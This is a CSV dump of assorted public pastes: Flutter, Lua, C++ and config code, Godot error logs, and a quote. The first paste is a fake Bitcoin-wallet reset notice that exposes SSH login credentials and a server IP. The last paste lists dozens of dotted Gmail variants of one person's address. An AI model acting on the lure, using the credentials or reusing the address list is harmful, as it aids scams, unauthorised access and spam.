id,title,username,language,date,content
ArusZgd1,BTC Wallet Credentials have been reset,refortzari_33,GetText,Saturday 3rd of June 2023 12:38:04 AM CDT,"Dear User
We have received a request to reset the login information for your Bitcoin wallet. If you did not make this request, please disregard this message.
Your new login credentials will be 
pacificcarvaht:gn3zHQ on 193.233.202.76(SSH)
Regards"
VuHbFE4F,shared_pref1,yudiwibisono,Dart,Saturday 3rd of June 2023 12:20:25 AM CDT,"//dependencies:
//  shared_preferences: ^2.1.1

import 'package:flutter/material.dart';
import 'package:shared_preferences/shared_preferences.dart';

void main() {
  runApp(const MyApp());
}

class MyApp extends StatefulWidget {
  const MyApp({Key? key}) : super(key: key);

  @override
  State<MyApp> createState() => _MyAppState();
}

class _MyAppState extends State<MyApp> {
  late Future<String> userId;

  //ambil dari sharedpref
  //return userId
  Future<String> ambilDataUser() async {
    final prefs = await SharedPreferences.getInstance();
    return (prefs.getString('userId') ?? """");
  }

  //simpan ke sharepref
  Future<void> simpanDataUser() async {
    final prefs = await SharedPreferences.getInstance();
    await prefs.setString('userId', ""budiWati"");
  }

  //hapus data sharedpref
  Future<void> hapusDataUser() async {
    final prefs = await SharedPreferences.getInstance();
    await prefs.remove('userId');
  }

  @override
  void initState() {
    super.initState();
    userId = ambilDataUser(); //isi userid
  }

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      home: Scaffold(
        body: Center(
            child: FutureBuilder<String>(
                future: userId,
                builder: (context, snapshot) {
                  if (snapshot.hasData) {
                    //user id belum ada di sharedpref
                    if (snapshot.data == """") {
                      return (Column(
                          mainAxisAlignment: MainAxisAlignment.center,
                          children: [
                            Text(""user belum login""),
                            ElevatedButton(
                              onPressed: () {
                                setState(() {
                                  //set userid (simulasi)
                                  //simpan ke sharedpref
                                  //sekaligus refresh
                                  simpanDataUser();
                                  userId = ambilDataUser();
                                }); //refresh
                              },
                              child: const Text('Login'),
                            ),
                          ]));
                    } else {
                      //sudah ada datauser di sharedpref
                      return (Column(
                          mainAxisAlignment: MainAxisAlignment.center,
                          children: [
                            Text(""userid: ${snapshot.data!}""),
                            ElevatedButton(
                              onPressed: () {
                                setState(() {
                                  //hapus sharedpref
                                  //sekaligus refresh
                                  hapusDataUser();
                                  userId = ambilDataUser();
                                }); //refresh
                              },
                              child: const Text('Logout'),
                            ),
                          ]));
                    }
                  } else {
                    return const CircularProgressIndicator();
                  }
                })),
      ),
    );
  }
}
"
P90b3Ecj,Godot-cpp example error output,FranAyrolo,Bash,Saturday 3rd of June 2023 12:10:11 AM CDT,"---------------USING GODOT-CPP AS IS, MASTER BRANCH, importing test/project/project.godot from the editor 
---------------EDITOR ERROR MESSAGES -------------
Godot Engine v4.0.3.stable.official (c) 2007-present Juan Linietsky, Ariel Manzur & Godot Contributors.
  modules/gltf/register_types.cpp:70 - Blend file import is enabled in the project settings, but no Blender path is configured in the editor settings. Blend files will not be imported.
--- Debug adapter server started ---
--- GDScript language server started ---
  Can't open dynamic library: /home/francisco/Documents/godot/godot-cpp/test/project/bin/libgdexample.linux.template_debug.x86_64.so. Error: /home/francisco/Documents/godot/../lib/libgdexample.linux.template_debug.x86_64.so: cannot open shared object file: No such file or directory
  core/extension/gdextension.cpp:400 - GDExtension dynamic library not found: /home/francisco/Documents/godot/godot-cpp/test/project/bin/libgdexample.linux.template_debug.x86_64.so
  Failed loading resource: res://example.gdextension. Make sure resources have been imported by opening the project in the editor at least once.
  res://main.gd:28 - Parse Error: Could not find type ""Example"" in the current scope.
  res://main.gd:33 - Parse Error: Identifier ""ExampleRef"" not declared in the current scope.
  res://main.gd:58 - Parse Error: Identifier ""ExampleRef"" not declared in the current scope.
  res://main.gd:94 - Parse Error: Identifier ""Example"" not declared in the current scope.
  res://main.gd:95 - Parse Error: Identifier ""Example"" not declared in the current scope.
  res://main.gd:97 - Parse Error: Identifier ""Example"" not declared in the current scope.
  res://main.gd:97 - Parse Error: Identifier ""Example"" not declared in the current scope.
  Cannot get class 'Example'.
  Cannot get class 'ExampleMin'.
  
 ------------------------LINUX CONSOLE OUTPUT ------------------- 
  
  WARNING: Blend file import is enabled in the project settings, but no Blender path is configured in the editor settings. Blend files will not be imported.
     at: _editor_init (modules/gltf/register_types.cpp:70)
ERROR: Can't open dynamic library: /home/francisco/Documents/godot/godot-cpp/test/project/bin/libgdexample.linux.template_debug.x86_64.so. Error: /home/francisco/Documents/godot/../lib/libgdexample.linux.template_debug.x86_64.so: cannot open shared object file: No such file or directory
   at: open_dynamic_library (drivers/unix/os_unix.cpp:447)
ERROR: GDExtension dynamic library not found: /home/francisco/Documents/godot/godot-cpp/test/project/bin/libgdexample.linux.template_debug.x86_64.so
   at: open_library (core/extension/gdextension.cpp:400)
ERROR: Failed loading resource: res://example.gdextension. Make sure resources have been imported by opening the project in the editor at least once.
   at: _load (core/io/resource_loader.cpp:222)
SCRIPT ERROR: Parse Error: Could not find type ""Example"" in the current scope.
          at: GDScript::reload (res://main.gd:28)
SCRIPT ERROR: Parse Error: Identifier ""ExampleRef"" not declared in the current scope.
          at: GDScript::reload (res://main.gd:33)
SCRIPT ERROR: Parse Error: Identifier ""ExampleRef"" not declared in the current scope.
          at: GDScript::reload (res://main.gd:58)
SCRIPT ERROR: Parse Error: Identifier ""Example"" not declared in the current scope.
          at: GDScript::reload (res://main.gd:94)
SCRIPT ERROR: Parse Error: Identifier ""Example"" not declared in the current scope.
          at: GDScript::reload (res://main.gd:95)
SCRIPT ERROR: Parse Error: Identifier ""Example"" not declared in the current scope.
          at: GDScript::reload (res://main.gd:97)
SCRIPT ERROR: Parse Error: Identifier ""Example"" not declared in the current scope.
          at: GDScript::reload (res://main.gd:97)
ERROR: Cannot get class 'Example'.
   at: instantiate (core/object/class_db.cpp:326)
ERROR: Cannot get class 'ExampleMin'.
   at: instantiate (core/object/class_db.cpp:326)
ERROR: Can't open dynamic library: /home/francisco/Documents/godot/godot-cpp/test/project/bin/libgdexample.linux.template_debug.x86_64.so. Error: /home/francisco/Documents/godot/../lib/libgdexample.linux.template_debug.x86_64.so: cannot open shared object file: No such file or directory
   at: open_dynamic_library (drivers/unix/os_unix.cpp:447)
ERROR: GDExtension dynamic library not found: /home/francisco/Documents/godot/godot-cpp/test/project/bin/libgdexample.linux.template_debug.x86_64.so
   at: open_library (core/extension/gdextension.cpp:400)
ERROR: Failed loading resource: res://example.gdextension. Make sure resources have been imported by opening the project in the editor at least once.
   at: _load (core/io/resource_loader.cpp:222)
ERROR: Can't open dynamic library: /home/francisco/Documents/godot/godot-cpp/test/project/bin/libgdexample.linux.template_debug.x86_64.so. Error: /home/francisco/Documents/godot/../lib/libgdexample.linux.template_debug.x86_64.so: cannot open shared object file: No such file or directory
   at: open_dynamic_library (drivers/unix/os_unix.cpp:447)
ERROR: GDExtension dynamic library not found: /home/francisco/Documents/godot/godot-cpp/test/project/bin/libgdexample.linux.template_debug.x86_64.so
   at: open_library (core/extension/gdextension.cpp:400)
ERROR: Failed loading resource: res://example.gdextension. Make sure resources have been imported by opening the project in the editor at least once.
   at: _load (core/io/resource_loader.cpp:222)


------------USING GODOT-CPP, STANDING ON 4.0 BRANCH, opening test/demo/project.godot
------------EDITOR OUTPUT --------------------
Godot Engine v4.0.3.stable.official (c) 2007-present Juan Linietsky, Ariel Manzur & Godot Contributors.
  modules/gltf/register_types.cpp:70 - Blend file import is enabled in the project settings, but no Blender path is configured in the editor settings. Blend files will not be imported.
--- Debug adapter server started ---
--- GDScript language server started ---
  Can't open dynamic library: /home/francisco/Documents/godot/godot-cpp/test/demo/bin/libgdexample.linux.template_debug.x86_64.so. Error: /home/francisco/Documents/godot/../lib/libgdexample.linux.template_debug.x86_64.so: cannot open shared object file: No such file or directory
  core/extension/gdextension.cpp:400 - GDExtension dynamic library not found: /home/francisco/Documents/godot/godot-cpp/test/demo/bin/libgdexample.linux.template_debug.x86_64.so
  Failed loading resource: res://example.gdextension. Make sure resources have been imported by opening the project in the editor at least once.
  res://main.gd:17 - Parse Error: Identifier ""Example"" not declared in the current scope.
  res://main.gd:18 - Parse Error: Identifier ""Example"" not declared in the current scope.
  res://main.gd:28 - Parse Error: Could not find type ""Example"" in the current scope.
  res://main.gd:39 - Parse Error: Identifier ""ExampleRef"" not declared in the current scope.
  res://main.gd:74 - Parse Error: Identifier ""Example"" not declared in the current scope.
  res://main.gd:75 - Parse Error: Identifier ""Example"" not declared in the current scope.
  res://main.gd:77 - Parse Error: Identifier ""Example"" not declared in the current scope.
  res://main.gd:77 - Parse Error: Identifier ""Example"" not declared in the current scope.
  Cannot get class 'Example'.
  Cannot get class 'ExampleMin'.
  In Object of type 'MissingNode': Attempt to connect nonexistent signal 'custom_signal' to callable 'Node(main.gd)::_on_Example_custom_signal'.

-------------LINUX CONSOLE OUTPUT-----------

WARNING: Blend file import is enabled in the project settings, but no Blender path is configured in the editor settings. Blend files will not be imported.
     at: _editor_init (modules/gltf/register_types.cpp:70)
ERROR: Can't open dynamic library: /home/francisco/Documents/godot/godot-cpp/test/demo/bin/libgdexample.linux.template_debug.x86_64.so. Error: /home/francisco/Documents/godot/../lib/libgdexample.linux.template_debug.x86_64.so: cannot open shared object file: No such file or directory
   at: open_dynamic_library (drivers/unix/os_unix.cpp:447)
ERROR: GDExtension dynamic library not found: /home/francisco/Documents/godot/godot-cpp/test/demo/bin/libgdexample.linux.template_debug.x86_64.so
   at: open_library (core/extension/gdextension.cpp:400)
ERROR: Failed loading resource: res://example.gdextension. Make sure resources have been imported by opening the project in the editor at least once.
   at: _load (core/io/resource_loader.cpp:222)
SCRIPT ERROR: Parse Error: Identifier ""Example"" not declared in the current scope.
          at: GDScript::reload (res://main.gd:17)
SCRIPT ERROR: Parse Error: Identifier ""Example"" not declared in the current scope.
          at: GDScript::reload (res://main.gd:18)
SCRIPT ERROR: Parse Error: Could not find type ""Example"" in the current scope.
          at: GDScript::reload (res://main.gd:28)
SCRIPT ERROR: Parse Error: Identifier ""ExampleRef"" not declared in the current scope.
          at: GDScript::reload (res://main.gd:39)
SCRIPT ERROR: Parse Error: Identifier ""Example"" not declared in the current scope.
          at: GDScript::reload (res://main.gd:74)
SCRIPT ERROR: Parse Error: Identifier ""Example"" not declared in the current scope.
          at: GDScript::reload (res://main.gd:75)
SCRIPT ERROR: Parse Error: Identifier ""Example"" not declared in the current scope.
          at: GDScript::reload (res://main.gd:77)
SCRIPT ERROR: Parse Error: Identifier ""Example"" not declared in the current scope.
          at: GDScript::reload (res://main.gd:77)
ERROR: Cannot get class 'Example'.
   at: instantiate (core/object/class_db.cpp:326)
ERROR: Cannot get class 'ExampleMin'.
   at: instantiate (core/object/class_db.cpp:326)
ERROR: In Object of type 'MissingNode': Attempt to connect nonexistent signal 'custom_signal' to callable 'Node(main.gd)::_on_Example_custom_signal'.
   at: connect (core/object/object.cpp:1256)"
5JeBXE1x,httpd.conf,TechieBraj,Bash,Friday 2nd of June 2023 11:32:24 PM CDT,"# # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #
#
#   
#       Warning: Do not edit this file directly, this file is autogenerated.
#   
#
# # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #


ServerRoot ""/usr/local/lsws""

Listen 0.0.0.0:80
Listen [::]:80
Listen 0.0.0.0:443
Listen [::]:443

User nobody
Group nobody
ServerAdmin root@localhost

<Directory />
    AllowOverride none
</Directory>

<Directory /home>
    AllowOverride All
    Options +Includes -Indexes +ExecCGI
</Directory>

DirectoryIndex index.php index.html

<Files "".ht*"">
    Require all denied
</Files>

ErrorLog ""/usr/local/lsws/logs/error.log""
LogLevel warn

LogFormat '%h %l %u %t \""%r\"" %>s %b \""%{Referer}i\"" \""%{User-Agent}i\""' combined
CustomLog ""/usr/local/lsws/logs/access.log"" combined


AddType application/x-compress .Z
AddType application/x-gzip .gz .tgz
AddType text/html .shtml
AddOutputFilter INCLUDES .shtml
#AddHandler cgi-script .cgi

AddDefaultCharset UTF-8

<IfModule mime_magic_module>
    MIMEMagicFile conf/magic
</IfModule>

EnableSendfile on

SSLProtocol all -SSLv3 -TLSv1
SSLHonorCipherOrder on

SSLCipherSuite ECDHE-RSA-AES256-GCM-SHA384:ECDHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-SHA384:ECDHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA:ECDHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES128-SHA256:DHE-RSA-AES256-SHA:DHE-RSA-AES128-SHA:AES256-GCM-SHA384:AES128-GCM-SHA256:AES256-SHA256:AES128-SHA256:AES256-SHA:AES128-SHA:HIGH:!EDH-RSA-DES-CBC3-SHA:!DES-CBC3-SHA:!aNULL:!eNULL:!EXPORT:!DES:!MD5:!PSK:!RC4

<IfModule Litespeed>
CacheRoot /home/lscache/
</IfModule>

<VirtualHost *:80>
DocumentRoot /usr/local/lsws/DEFAULT/html
</VirtualHost>
<VirtualHost *:443>
DocumentRoot /usr/local/lsws/DEFAULT/html
</VirtualHost>
Include /usr/local/lsws/conf/modsec.conf
Include /usr/local/lsws/conf/vhosts/boatengine.com/vhost.conf
Include /usr/local/lsws/conf/vhosts/mail.boatengine.com/vhost.conf
"
2EavRVzh,Eua from Higurashi is dammmm,RaminCubic,C,Friday 2nd of June 2023 10:28:57 PM CDT,"Wrong, it will not end, it never will. No matter how much you try to run away, breathe rapidly, or even hit yourself, it will never end. Your misery will keep on going and going, you won't ever get used to it, you won't get any time to think about it, you'll just suffer endlessly and needlessly. -Eua, Higurashi Sotsu (probably)

(Whoever you are, why are you reading this lol)"
sXZXNJZr,Reactor Toolkit Mk1,ebrobertson,Lua,Friday 2nd of June 2023 10:01:41 PM CDT,"--[[
   Extreme Reactors Utility Script Mk 1
   Author: Evan Robertson
   Created: 2023-06-02
   Updated: 2023-06-02
   A generic utility script to be used with Computer Craft / CC:Tweaked and Extreme Reactors
]]--

--[[
   Globals
]]

local clock = os.clock

--[[
   clearScreen
   clears the computer's output
]]
local function clearScrean()
   for i=1,13 do
      print("""")
   end
end

local function displayMenu()
   clearScrean()
   print(""Reactor Toolkit Mk1"")
   print(""~~~~~"")
   print(""WIP!"")
   print(""~~~~~"")
   print(""Please Choose an option:"")
   print("""")
   print(""1. Monitor Mode"")
   print("""")
   print(""Type help to view help menu or exit to quit"")
end -- function printMenu

local function displayHelpMenu()
   clearScrean()
   print(""Reactor Toolkit Mk1"")
   print(""~~~~~"")
   print(""Choose an option to get help on:"")
   print(""~~~~~"")
   print(""Please Choose an option:"")
   print("""")
   print(""1. Monitor Mode"")
   print("""")
   print(""Enter exit to return to main menu"")
end -- function printHelpMenu

local function displayOptionHelp(option)
   if option == nil then
      print(""invalid option!"")
      print(""Press enter to return"")
      read()
      return
   end -- if nil or NaN

   if option == 1 then
      clearScrean()
      print(""Monitor Mode: "")
      print(""~~~~~"")
      print(""Attach to a reactor's computer port and the computer will monitor the reactor's energy storage."")
      print(""When storage is full, turns off the reactor to preserve fuel."")
      print(""WIP - Monitoring heat, fuel consumption levels, and compiling data so you can be more informed as to how to improve reactor efficiency."")
      print(""Press enter to return"")
      read()
   end -- if option 1

end -- function displayOptionHelp

--[[
   sleep
   makes the program wait n number of seconds
]]
local function pauseProg(n)  -- seconds
  local t0 = clock()
  while clock() - t0 <= n do end
end -- function sleep

--[[
   wrapReactor
   Checks for a reactor peripheral and wraps it onto a global
   returns the wrapped reactor or false if no reactor was found
]]
local function wrapReactor()
   local wrappedReactor
   wrappedReactor = peripheral.wrap('back')
   if peripheral.getType(wrappedReactor) == ""BigReactors-Reactor"" then
      return wrappedReactor
   end 
   wrappedReactor = peripheral.wrap('left')
   if peripheral.getType(wrappedReactor) == ""BigReactors-Reactor"" then
      return wrappedReactor
   end 
   wrappedReactor = peripheral.wrap('right')
   if peripheral.getType(wrappedReactor) == ""BigReactors-Reactor"" then
      return wrappedReactor
   end 
   wrappedReactor = peripheral.wrap('front')
   if peripheral.getType(wrappedReactor) == ""BigReactors-Reactor"" then
      return wrappedReactor
   end 
   wrappedReactor = peripheral.wrap('top')
   if peripheral.getType(wrappedReactor) == ""BigReactors-Reactor"" then
      return wrappedReactor
   end 
   wrappedReactor = peripheral.wrap('bottom')
   if peripheral.getType(wrappedReactor) == ""BigReactors-Reactor"" then
      return wrappedReactor
   end 
   return false
end -- function wrapReactor

--[[
   monitorReactor
   Monitors the reactor's fuel level, energy storage, and toggles the power on/off   
]]
local function monitorReactor(reactor)

   local fuel
   local maxFuel
   local caseTemp
   local energy
   local maxEnergy
   local energyStats
   local fuelStats   
   local isActive

   -- to turn on: reactor.setActive() 
   fuel        = reactor.getFuelAmount()
   maxFuel     = reactor.getFuelAmountMax()
   energy      = reactor.getEnergyStored()
   maxEnergy   = reactor.getEnergyCapacity()
   caseTemp    = reactor.getCasingTemperature()
   energyStats = reactor.getEnergyStats()
   fuelStats   = reactor.getFuelStats()
   isActive    = reactor.getActive()

   if fuel == 0 then
      print(""Ran out of fuel!"")
      return
   else
      print(""Fuel:"",fuel)
   end

   if energy < maxEnergy then
      if not isActive then 
         reactor.setActive(true)
      end
   else
      if isActive then 
         reactor.setActive(false)
      end
   end

   if isActive then print(""Reactor Status: Powered on"") else print(""Reactor Status: Powered off"") end

   pauseProg(5)
   sleep(0)

   monitorReactor(reactor)

end -- monitorReactor

-- main program

local input
local success
input = """"
while input ~= ""exit"" do
   displayMenu()
   input = read()
   if input == ""1"" then
      clearScrean()
      success = wrapReactor()
      if not success then
         print(""No reactor found! Ensure a Reactor Computer Port and a working reactor are connected to the computer."")
         return
      end
      monitorReactor(success)
      return
   elseif input == ""help"" then
      input = """"
      while input ~= ""exit"" do
         displayHelpMenu()   
         input = read()
         displayOptionHelp(input)
      end      
      input = """"
   end
end


print(""Program exit. Thank you for using Reactor Toolkit Mk1."")

--[[
   for key, value in pairs(rea) do print(key) read() end

]]"
HmskxG3q,ejercicio_06.cpp,Lucarts,C++,Friday 2nd of June 2023 09:31:17 PM CDT,"// Tp 06 - Array
// Ejerdicio 06

/*
Se ingresa por teclado un vector de 10 elementos todos distintos entre sí.
Luego eliminar el valor máximo y desplazar todos los elementos un lugar.

Ejemplo:
Vector → {1 3 9 1 4 6 2 0 5 7 }, quedará → {1 3 1 4 6 2 0 5 7}
Nota: No mostrar el último elemento del vector.
*/

#include <iostream>
using namespace std;

int main()
{
  const int ELEMENTOS = 10;
  int vector[ELEMENTOS] = {};
  int maximo, indice;

  cout << endl;
  cout << ""Ingrese "" << ELEMENTOS << "" numeros. "" << endl;

  for (int i = 0; i < ELEMENTOS; i++)
  {
    cout << ""# "" << i + 1 << "": "";
    cin >> vector[i];
  }

  maximo = vector[0];
  indice = 0;

  for (int i = 1; i < ELEMENTOS; i++)
  {
    if (vector[i] > maximo)
    {
      maximo = vector[i];
      indice = i;
    }
  }
  cout << endl;
  cout << ""--------------------------"" << endl;
  cout << "" Maximo ---------> "" << maximo << "" y su posicion indice es "" << indice << endl;

  for (int i = indice + 1; i < ELEMENTOS; i++)
  {
    vector[i - 1] = vector[i];
  }

  cout << endl;
  cout << ""{ "";
  for (int i = 0; i < ELEMENTOS - 1; i++)
  {
    cout << vector[i] << "" "";
  }
  cout << ""}"" << endl;

  return 0;
}"
f1UEFTWJ,Untitled,bombaires,HTML,Friday 2nd of June 2023 09:24:57 PM CDT,"<a href=""mailto:beatricemaubert006@gmail.com"">beatricemaubert006@gmail.com</a>
<a href=""mailto:b.e.at.r.ic.e.m.a.u.b.e.r.t.0.06@gmail.com"">b.e.at.r.ic.e.m.a.u.b.e.r.t.0.06@gmail.com</a>
<a href=""mailto:b.ea.tri.cem.a.ub.e.rt006@gmail.com"">b.ea.tri.cem.a.ub.e.rt006@gmail.com</a>
<a href=""mailto:beatri.ce.m.a.ube.rt.0.06@gmail.com"">beatri.ce.m.a.ube.rt.0.06@gmail.com</a>
<a href=""mailto:bea.tri.cemau.be.r.t.00.6@gmail.com"">bea.tri.cemau.be.r.t.00.6@gmail.com</a>
<a href=""mailto:be.atri.c.e.maubert006@gmail.com"">be.atri.c.e.maubert006@gmail.com</a>
<a href=""mailto:b.e.at.r.ice.ma.u.b.e.rt.00.6@gmail.com"">b.e.at.r.ice.ma.u.b.e.rt.00.6@gmail.com</a>
<a href=""mailto:be.a.trice.ma.u.b.e.rt00.6@gmail.com"">be.a.trice.ma.u.b.e.rt00.6@gmail.com</a>
<a href=""mailto:be.a.tr.ice.ma.u.be.rt.00.6@gmail.com"">be.a.tr.ice.ma.u.be.rt.00.6@gmail.com</a>
<a href=""mailto:be.a.t.ricema.u.be.rt.00.6@gmail.com"">be.a.t.ricema.u.be.rt.00.6@gmail.com</a>
<a href=""mailto:b.eatr.i.cem.aube.rt.00.6@gmail.com"">b.eatr.i.cem.aube.rt.00.6@gmail.com</a>
<a href=""mailto:beat.ri.cem.a.ub.ert.00.6@gmail.com"">beat.ri.cem.a.ub.ert.00.6@gmail.com</a>
<a href=""mailto:b.e.a.t.r.ic.em.a.ub.er.t0.0.6@gmail.com"">b.e.a.t.r.ic.em.a.ub.er.t0.0.6@gmail.com</a>
<a href=""mailto:b.eat.r.i.c.e.m.a.ub.er.t.00.6@gmail.com"">b.eat.r.i.c.e.m.a.ub.er.t.00.6@gmail.com</a>
<a href=""mailto:beatri.ce.m.aube.rt0.0.6@gmail.com"">beatri.ce.m.aube.rt0.0.6@gmail.com</a>
<a href=""mailto:b.eat.r.i.c.em.aube.rt0.0.6@gmail.com"">b.eat.r.i.c.em.aube.rt0.0.6@gmail.com</a>
<a href=""mailto:b.e.atr.i.ce.ma.u.b.e.rt00.6@gmail.com"">b.e.atr.i.ce.ma.u.b.e.rt00.6@gmail.com</a>
<a href=""mailto:b.ea.tr.i.cem.au.b.er.t.0.06@gmail.com"">b.ea.tr.i.cem.au.b.er.t.0.06@gmail.com</a>
<a href=""mailto:be.at.ricemau.b.er.t.0.06@gmail.com"">be.at.ricemau.b.er.t.0.06@gmail.com</a>
<a href=""mailto:b.e.atric.em.aub.ert0.06@gmail.com"">b.e.atric.em.aub.ert0.06@gmail.com</a>
<a href=""mailto:be.at.ric.ema.u.be.rt.00.6@gmail.com"">be.at.ric.ema.u.be.rt.00.6@gmail.com</a>
<a href=""mailto:b.e.atr.i.c.ema.u.be.rt006@gmail.com"">b.e.atr.i.c.ema.u.be.rt006@gmail.com</a>
<a href=""mailto:bea.t.r.ice.m.au.b.e.rt006@gmail.com"">bea.t.r.ice.m.au.b.e.rt006@gmail.com</a>
<a href=""mailto:bea.t.r.i.c.e.mau.be.rt.00.6@gmail.com"">bea.t.r.i.c.e.mau.be.rt.00.6@gmail.com</a>
<a href=""mailto:be.atr.i.cem.a.ub.e.rt.0.06@gmail.com"">be.atr.i.cem.a.ub.e.rt.0.06@gmail.com</a>
<a href=""mailto:b.e.at.r.i.c.em.aube.r.t.0.06@gmail.com"">b.e.at.r.i.c.em.aube.r.t.0.06@gmail.com</a>
<a href=""mailto:beat.ri.c.e.m.aube.rt0.06@gmail.com"">beat.ri.c.e.m.aube.rt0.06@gmail.com</a>
<a href=""mailto:b.ea.t.r.ice.m.a.u.b.er.t.00.6@gmail.com"">b.ea.t.r.ice.m.a.u.b.er.t.00.6@gmail.com</a>
<a href=""mailto:b.e.a.tr.ic.em.a.u.b.e.r.t006@gmail.com"">b.e.a.tr.ic.em.a.u.b.e.r.t006@gmail.com</a>
<a href=""mailto:bea.tr.i.ce.maubert006@gmail.com"">bea.tr.i.ce.maubert006@gmail.com</a>
<a href=""mailto:be.atr.ic.ema.ube.r.t.00.6@gmail.com"">be.atr.ic.ema.ube.r.t.00.6@gmail.com</a>
<a href=""mailto:be.a.tr.i.cemau.b.er.t.0.06@gmail.com"">be.a.tr.i.cemau.b.er.t.0.06@gmail.com</a>
<a href=""mailto:b.e.a.t.ricema.u.be.r.t.00.6@gmail.com"">b.e.a.t.ricema.u.be.r.t.00.6@gmail.com</a>
<a href=""mailto:bea.tr.i.c.ema.ub.e.r.t006@gmail.com"">bea.tr.i.c.ema.ub.e.r.t006@gmail.com</a>
<a href=""mailto:be.atr.ice.ma.ube.r.t.006@gmail.com"">be.atr.ice.ma.ube.r.t.006@gmail.com</a>
<a href=""mailto:bea.tri.ce.ma.u.be.rt0.06@gmail.com"">bea.tri.ce.ma.u.be.rt0.06@gmail.com</a>
<a href=""mailto:be.atri.cema.u.b.e.rt0.0.6@gmail.com"">be.atri.cema.u.b.e.rt0.0.6@gmail.com</a>
<a href=""mailto:b.ea.trice.m.a.ub.e.rt.006@gmail.com"">b.ea.trice.m.a.ub.e.rt.006@gmail.com</a>
<a href=""mailto:beatri.c.e.ma.ub.ert.0.06@gmail.com"">beatri.c.e.ma.ub.ert.0.06@gmail.com</a>
<a href=""mailto:be.a.t.ri.cema.u.b.e.rt006@gmail.com"">be.a.t.ri.cema.u.b.e.rt006@gmail.com</a>
<a href=""mailto:be.a.t.ri.c.em.a.u.b.er.t.00.6@gmail.com"">be.a.t.ri.c.em.a.u.b.er.t.00.6@gmail.com</a>
<a href=""mailto:b.eat.ri.c.e.mau.be.r.t.0.0.6@gmail.com"">b.eat.ri.c.e.mau.be.r.t.0.0.6@gmail.com</a>
<a href=""mailto:b.e.a.tricem.a.uber.t0.0.6@gmail.com"">b.e.a.tricem.a.uber.t0.0.6@gmail.com</a>
<a href=""mailto:b.e.at.r.ic.e.mau.b.e.rt0.06@gmail.com"">b.e.at.r.ic.e.mau.b.e.rt0.06@gmail.com</a>
<a href=""mailto:b.e.atr.i.c.em.a.ub.e.r.t.006@gmail.com"">b.e.atr.i.c.em.a.ub.e.r.t.006@gmail.com</a>
<a href=""mailto:b.e.at.r.i.ce.ma.ube.rt0.06@gmail.com"">b.e.at.r.i.ce.ma.ube.rt0.06@gmail.com</a>
<a href=""mailto:b.e.at.ri.ce.ma.ub.e.r.t006@gmail.com"">b.e.at.ri.ce.ma.ub.e.r.t006@gmail.com</a>
<a href=""mailto:be.a.tr.ic.emau.bert0.0.6@gmail.com"">be.a.tr.ic.emau.bert0.0.6@gmail.com</a>
<a href=""mailto:b.eatrice.m.au.b.e.rt006@gmail.com"">b.eatrice.m.au.b.e.rt006@gmail.com</a>
<a href=""mailto:b.eat.ric.emaubert0.0.6@gmail.com"">b.eat.ric.emaubert0.0.6@gmail.com</a>
<a href=""mailto:beatr.i.cem.aub.er.t.0.0.6@gmail.com"">beatr.i.cem.aub.er.t.0.0.6@gmail.com</a>
<a href=""mailto:b.e.at.r.i.c.ema.u.b.e.r.t.00.6@gmail.com"">b.e.at.r.i.c.ema.u.b.e.r.t.00.6@gmail.com</a>
<a href=""mailto:b.e.atri.cema.ube.rt.006@gmail.com"">b.e.atri.cema.ube.rt.006@gmail.com</a>
<a href=""mailto:b.eatr.i.cem.a.u.ber.t006@gmail.com"">b.eatr.i.cem.a.u.ber.t006@gmail.com</a>
<a href=""mailto:b.ea.t.r.i.ce.ma.u.bert0.0.6@gmail.com"">b.ea.t.r.i.ce.ma.u.bert0.0.6@gmail.com</a>
<a href=""mailto:be.a.tr.icema.u.be.rt0.0.6@gmail.com"">be.a.tr.icema.u.be.rt0.0.6@gmail.com</a>
<a href=""mailto:be.a.tr.ice.mau.b.e.rt.00.6@gmail.com"">be.a.tr.ice.mau.b.e.rt.00.6@gmail.com</a>
<a href=""mailto:b.ea.tricem.au.be.rt0.06@gmail.com"">b.ea.tricem.au.be.rt0.06@gmail.com</a>
<a href=""mailto:be.a.tr.i.c.emaub.er.t00.6@gmail.com"">be.a.tr.i.c.emaub.er.t00.6@gmail.com</a>
<a href=""mailto:b.e.atri.cem.au.b.e.r.t.0.0.6@gmail.com"">b.e.atri.cem.au.b.e.r.t.0.0.6@gmail.com</a>
<a href=""mailto:be.a.trice.m.a.u.b.ert.00.6@gmail.com"">be.a.trice.m.a.u.b.ert.00.6@gmail.com</a>
<a href=""mailto:b.eat.r.icema.ubert.0.06@gmail.com"">b.eat.r.icema.ubert.0.06@gmail.com</a>
<a href=""mailto:beat.ri.ce.ma.ub.ert00.6@gmail.com"">beat.ri.ce.ma.ub.ert00.6@gmail.com</a>
<a href=""mailto:b.e.at.r.ice.m.au.ber.t0.06@gmail.com"">b.e.at.r.ice.m.au.ber.t0.06@gmail.com</a>
<a href=""mailto:b.eat.r.i.ce.m.aub.er.t.006@gmail.com"">b.eat.r.i.ce.m.aub.er.t.006@gmail.com</a>
<a href=""mailto:b.eat.r.i.c.e.mau.b.er.t00.6@gmail.com"">b.eat.r.i.c.e.mau.b.er.t00.6@gmail.com</a>
<a href=""mailto:bea.tr.ic.e.maub.ert.006@gmail.com"">bea.tr.ic.e.maub.ert.006@gmail.com</a>
<a href=""mailto:beatr.icemau.bert0.06@gmail.com"">beatr.icemau.bert0.06@gmail.com</a>
<a href=""mailto:be.atric.em.a.u.b.ert.006@gmail.com"">be.atric.em.a.u.b.ert.006@gmail.com</a>
<a href=""mailto:beatr.i.cem.au.b.e.r.t.006@gmail.com"">beatr.i.cem.au.b.e.r.t.006@gmail.com</a>
<a href=""mailto:b.eatric.e.mauber.t0.0.6@gmail.com"">b.eatric.e.mauber.t0.0.6@gmail.com</a>
<a href=""mailto:beat.ri.c.emau.b.e.r.t.0.0.6@gmail.com"">beat.ri.c.emau.b.e.r.t.0.0.6@gmail.com</a>
<a href=""mailto:bea.tri.c.e.m.au.b.e.rt0.06@gmail.com"">bea.tri.c.e.m.au.b.e.rt0.06@gmail.com</a>
<a href=""mailto:b.ea.t.ri.cem.a.ub.e.r.t.0.06@gmail.com"">b.ea.t.ri.cem.a.ub.e.r.t.0.06@gmail.com</a>
